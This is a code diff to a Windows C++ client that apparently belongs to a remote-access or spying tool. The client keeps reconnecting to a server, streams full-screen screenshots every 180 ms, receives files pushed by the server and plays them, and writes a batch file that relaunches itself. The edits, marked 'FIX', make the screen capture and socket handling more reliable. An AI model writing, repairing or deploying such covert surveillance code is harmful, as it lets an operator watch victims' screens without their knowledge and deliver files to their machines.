@@ -1,4 +1,3 @@
-// client.cpp
 #include <winsock2.h>
 #include <ws2tcpip.h>
 #include <windows.h>
@@ -95,6 +94,8 @@ void CommandListener(SOCKET s) {
             std::ofstream out(f, std::ios::binary);
             out.write(buf.data(), sz);
             out.close();
+            // FIX: close previous alias before opening a new one
+            mciSendStringA("close nyx", 0,0,0);
             mciSendStringA(("open \"" + f + "\" type mpegvideo alias nyx").c_str(), 0,0,0);
             mciSendStringA("play nyx", 0,0,0);
         }
@@ -110,8 +111,18 @@ int main() {
     bat << "@echo off\nstart \"\" \"" << me << "\"\n";
     bat.close();
 
+    // FIX: WSAStartup/Cleanup outside the reconnect loop
+    WSADATA wsa;
+    WSAStartup(MAKEWORD(2,2), &wsa);
+
+    // FIX: GDI+ init once, not every reconnect
+    Gdiplus::GdiplusStartupInput gdip;
+    ULONG_PTR gdipTok;
+    Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);
+    CLSID jpegClsid;
+    GetEncoderClsid(L"image/jpeg", &jpegClsid);
+
     while(true) {
-        WSADATA wsa; WSAStartup(MAKEWORD(2,2), &wsa);
         SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
         sockaddr_in addr{};
         addr.sin_family = AF_INET;
@@ -121,34 +132,37 @@ int main() {
             std::thread cmd(CommandListener, sock);
             cmd.detach();
 
-            Gdiplus::GdiplusStartupInput gdip;
-            ULONG_PTR gdipTok;
-            Gdiplus::GdiplusStartup(&gdipTok, &gdip, 0);
-            CLSID jpegClsid;
-            GetEncoderClsid(L"image/jpeg", &jpegClsid);
-
             while(true) {
-                HWND hwnd = GetDesktopWindow();
-                HDC hdc = GetDC(hwnd);
-                RECT r; GetClientRect(hwnd, &r);
-                int w = r.right, h = r.bottom;
+                // FIX: use GetDC(NULL) + GetSystemMetrics for reliable fullscreen capture
+                HDC hdc = GetDC(NULL);
+                int w = GetSystemMetrics(SM_CXSCREEN);
+                int h = GetSystemMetrics(SM_CYSCREEN);
                 HDC mem = CreateCompatibleDC(hdc);
                 HBITMAP bmp = CreateCompatibleBitmap(hdc, w, h);
-                SelectObject(mem, bmp);
+                HBITMAP oldBmp = (HBITMAP)SelectObject(mem, bmp);
                 BitBlt(mem,0,0,w,h, hdc,0,0, SRCCOPY);
-                Gdiplus::Bitmap gdibmp(bmp, NULL);
-                DeleteObject(bmp); DeleteDC(mem);
-                ReleaseDC(hwnd, hdc);
 
+                // FIX: save to stream WHILE the HBITMAP is still alive
                 IStream* strm = 0;
                 CreateStreamOnHGlobal(0, TRUE, &strm);
-                gdibmp.Save(strm, &jpegClsid, 0);
-                STATSTG st; strm->Stat(&st, STATFLAG_NONAME);
+                {
+                    Gdiplus::Bitmap gdibmp(bmp, NULL);
+                    gdibmp.Save(strm, &jpegClsid, 0);
+                }
+                // NOW safe to clean up GDI objects
+                SelectObject(mem, oldBmp);
+                DeleteObject(bmp);
+                DeleteDC(mem);
+                ReleaseDC(NULL, hdc);
+
+                STATSTG st;
+                strm->Stat(&st, STATFLAG_NONAME);
                 ULONG len = st.cbSize.LowPart;
                 BYTE* data = new BYTE[len];
                 LARGE_INTEGER li{};
                 strm->Seek(li, STREAM_SEEK_SET, 0);
-                ULONG rd; strm->Read(data, len, &rd);
+                ULONG rd;
+                strm->Read(data, len, &rd);
                 strm->Release();
 
                 if(!SendAll(sock, (char*)&len, 4) || !SendAll(sock, (char*)data, len)) {
@@ -158,11 +172,11 @@ int main() {
                 delete[] data;
                 Sleep(180);
             }
-            Gdiplus::GdiplusShutdown(gdipTok);
         }
         closesocket(sock);
-        WSACleanup();
         Sleep(5000);
     }
+    Gdiplus::GdiplusShutdown(gdipTok);
+    WSACleanup();
     return 0;
 }
